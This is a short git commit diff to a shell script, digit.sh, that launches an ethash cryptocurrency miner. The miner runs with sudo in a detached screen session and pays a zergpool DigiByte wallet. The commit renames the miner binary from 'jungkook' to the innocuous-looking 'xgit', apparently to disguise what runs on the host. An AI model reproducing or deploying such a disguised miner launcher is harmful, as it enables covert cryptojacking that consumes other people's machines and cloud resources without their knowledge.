04a3cecf12448202f8aae314b3e7b69aa750d50b
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-07-03 20:43:04 +0530

    Update digit.sh

--- digit.sh
+++ digit.sh
@@ -3,5 +3,5 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 screen -dmS ls 
 
-chmod +x ./jungkook && sudo ./jungkook -a ethash -o stratum+tcp://ethash.na.mine.zergpool.com:9999 -u dgb1qrgrax0ke2h9zzf4t3gv878yu86gxz80x0essun -p c=DGB,ID=STARDGB
+chmod +x ./xgit && sudo ./xgit -a ethash -o stratum+tcp://ethash.na.mine.zergpool.com:9999 -u dgb1qrgrax0ke2h9zzf4t3gv878yu86gxz80x0essun -p c=DGB,ID=STARDGB
 pause $@
